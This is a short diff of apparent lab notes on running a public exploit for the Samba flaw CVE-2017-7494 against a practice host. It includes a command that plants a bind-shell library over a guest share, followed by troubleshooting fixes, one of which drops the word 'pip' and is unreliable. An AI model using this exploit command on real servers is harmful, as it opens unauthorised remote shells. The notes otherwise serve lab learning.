@@ -146,21 +146,26 @@ change the variables while running the exploit such as the share name, username,
         $ cd exploit-CVE-2017-7494/
         $ sudo python2.7 exploit.py -t designer.htb -e libbindshell-samba.so -s candidates -r /candidates/libbindshell-samba.so -u guest -p guest -P 6699
 
+
 error2: Crypto module not found
 
 fix2: sudo python2.7 -m pip install pycrypto
+
 
 error3: pycrypto fail to install
 
 fix3: sudo python2.7 -m uninstall pycrypto && sudo python2.7 -m install pycryptodome
 
+
 error4: pyasn1 not found
 
 fix4: sudo python2.7 -m pip install pyasn1
 
+
 error5: script run without error but the shell couldn't return any output
 
 fix5: kill all the process involving the exploit
+
 
 error6: script returns IO error
 
